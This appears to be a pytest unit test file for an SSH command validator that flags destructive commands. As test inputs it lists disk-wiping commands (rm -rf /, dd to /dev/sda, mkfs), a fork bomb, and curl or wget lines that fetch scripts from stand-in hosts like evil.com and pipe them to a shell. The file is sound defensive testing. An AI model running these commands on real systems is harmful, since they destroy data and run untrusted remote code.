"""Unit tests for SSH command security validator"""

import pytest
from src.security.command_validator import is_dangerous_command, DANGEROUS_PATTERNS


class TestDangerousCommandDetection:
    """Test detection of dangerous commands"""

    def test_rm_rf_root(self):
        """Should detect rm -rf / as dangerous"""
        assert is_dangerous_command("rm -rf /") is True
        assert is_dangerous_command("rm -rf /*") is True
        assert is_dangerous_command("sudo rm -rf /") is True

    def test_rm_rf_safe(self):
        """Should allow safe rm -rf commands"""
        assert is_dangerous_command("rm -rf /tmp/mydir") is False
        assert is_dangerous_command("rm -rf ./build") is False
        assert is_dangerous_command("rm -rf ~/oldfiles") is False

    def test_dd_disk_wipe(self):
        """Should detect dd disk wipe as dangerous"""
        assert is_dangerous_command("dd if=/dev/zero of=/dev/sda") is True
        assert is_dangerous_command("dd if=/dev/urandom of=/dev/sdb") is True
        assert is_dangerous_command("sudo dd if=/dev/zero of=/dev/nvme0n1") is True

    def test_dd_safe(self):
        """Should allow safe dd commands"""
        assert is_dangerous_command("dd if=input.iso of=output.iso") is False
        assert is_dangerous_command("dd if=/dev/sda of=backup.img") is False

    def test_mkfs_format(self):
        """Should detect mkfs as dangerous"""
        assert is_dangerous_command("mkfs.ext4 /dev/sda1") is True
        assert is_dangerous_command("mkfs -t ext4 /dev/sdb") is True
        assert is_dangerous_command("sudo mkfs.xfs /dev/nvme0n1p1") is True

    def test_fork_bomb(self):
        """Should detect fork bomb pattern"""
        assert is_dangerous_command(":(){ :|:& };:") is True
        assert is_dangerous_command(":() { :|:& }; :") is True

    def test_wget_pipe_shell(self):
        """Should detect wget piped to shell"""
        assert is_dangerous_command("wget http://evil.com/script.sh | sh") is True
        assert is_dangerous_command("wget -O - http://bad.com/install.sh | bash") is True

    def test_wget_safe(self):
        """Should allow safe wget usage"""
        assert is_dangerous_command("wget https://example.com/file.tar.gz") is False
        assert is_dangerous_command("wget -O output.txt https://api.example.com/data") is False

    def test_curl_pipe_shell(self):
        """Should detect curl piped to shell"""
        assert is_dangerous_command("curl http://evil.com/script.sh | bash") is True
        assert is_dangerous_command("curl -sSL https://bad.com/install | sh") is True

    def test_curl_safe(self):
        """Should allow safe curl usage"""
        assert is_dangerous_command("curl https://api.example.com/endpoint") is False
        assert is_dangerous_command("curl -X POST -d 'data' https://webhook.site/xyz") is False

    def test_case_insensitive(self):
        """Should be case insensitive"""
        assert is_dangerous_command("RM -RF /") is True
        assert is_dangerous_command("DD IF=/dev/zero OF=/dev/sda") is True
        assert is_dangerous_command("MKFS.EXT4 /dev/sdb") is True

    def test_safe_common_commands(self):
        """Should allow common safe commands"""
        safe_commands = [
            "ls -la",
            "pwd",
            "whoami",
            "docker ps -a",
            "docker logs container_name",
            "systemctl status nginx",
            "cat /var/log/syslog",
            "tail -f /var/log/app.log",
            "grep error /var/log/nginx/error.log",
            "df -h",
            "free -m",
            "uptime",
            "ps aux",
            "top -n 1",
            "apt update",
            "apt install nginx",
            "git status",
            "git log",
            "npm install",
            "python --version",
            "node --version",
        ]

        for cmd in safe_commands:
            assert is_dangerous_command(cmd) is False, f"Safe command marked as dangerous: {cmd}"

    def test_complex_safe_commands(self):
        """Should allow complex but safe commands"""
        safe_complex = [
            "find /var/log -name '*.log' -mtime +30 -delete",
            "tar -czf backup.tar.gz /home/user/data",
            "docker exec -it container_name bash -c 'ls -la'",
            "grep -r 'error' /var/log | head -20",
            "awk '{print $1}' access.log | sort | uniq -c",
        ]

        for cmd in safe_complex:
            assert is_dangerous_command(cmd) is False, f"Safe complex command marked as dangerous: {cmd}"

    def test_empty_command(self):
        """Should handle empty command"""
        assert is_dangerous_command("") is False
        assert is_dangerous_command("   ") is False

    def test_command_with_multiple_pipes(self):
        """Should handle commands with multiple pipes correctly"""
        # Dangerous pipe
        assert is_dangerous_command("cat script.sh | bash") is True

        # Safe pipes
        assert is_dangerous_command("ps aux | grep nginx | awk '{print $2}'") is False
        assert is_dangerous_command("docker ps | grep running") is False

    def test_dangerous_patterns_coverage(self):
        """Verify all dangerous patterns are tested"""
        # This test ensures we have coverage for all patterns in DANGEROUS_PATTERNS
        # Pattern names from command_validator.py
        expected_patterns = [
            'rm -rf /',
            'dd if=/dev/zero',
            'mkfs',
            'fork bomb',
            'wget pipe',
            'curl pipe',
        ]

        # We should have at least one test for each pattern type
        # This is more of a documentation test
        assert len(DANGEROUS_PATTERNS) >= 6, "Expected at least 6 dangerous patterns"


class TestPatternRobustness:
    """Test pattern matching robustness"""

    def test_patterns_with_extra_spaces(self):
        """Should detect patterns with extra spaces"""
        assert is_dangerous_command("rm  -rf  /") is True
        assert is_dangerous_command("dd  if=/dev/zero  of=/dev/sda") is True

    def test_patterns_with_tabs(self):
        """Should detect patterns with tabs"""
        assert is_dangerous_command("rm\t-rf\t/") is True

    def test_patterns_at_end_of_complex_command(self):
        """Should detect dangerous patterns even in complex commands"""
        assert is_dangerous_command("cd /tmp && rm -rf /") is True
        assert is_dangerous_command("echo 'Starting...' && dd if=/dev/zero of=/dev/sda") is True

    def test_patterns_with_sudo(self):
        """Should detect patterns even with sudo"""
        assert is_dangerous_command("sudo rm -rf /") is True
        assert is_dangerous_command("sudo -i dd if=/dev/zero of=/dev/sda") is True

    def test_safe_variants_of_dangerous_patterns(self):
        """Should not flag safe variants"""
        # rm -rf on non-root paths
        assert is_dangerous_command("rm -rf /home/user/temp") is False

        # dd reading from device (backup), not writing to it
        assert is_dangerous_command("dd if=/dev/sda of=backup.img") is False


class TestEdgeCases:
    """Test edge cases and boundary conditions"""

    def test_none_input(self):
        """Should handle None input gracefully"""
        # Depending on implementation, might raise or return False
        # Let's test what makes sense
        with pytest.raises((TypeError, AttributeError)):
            is_dangerous_command(None)

    def test_unicode_command(self):
        """Should handle unicode characters"""
        assert is_dangerous_command("echo 'Olá mundo'") is False
        assert is_dangerous_command("echo '你好'") is False

    def test_very_long_command(self):
        """Should handle very long commands"""
        long_safe_command = "echo " + "a" * 10000
        assert is_dangerous_command(long_safe_command) is False

        long_dangerous_command = "echo hello && rm -rf /"
        assert is_dangerous_command(long_dangerous_command) is True

    def test_multiline_command(self):
        """Should handle multiline commands"""
        multiline = """
        echo "First line"
        echo "Second line"
        """
        assert is_dangerous_command(multiline) is False

        multiline_dangerous = """
        echo "Setting up..."
        rm -rf /
        """
        assert is_dangerous_command(multiline_dangerous) is True
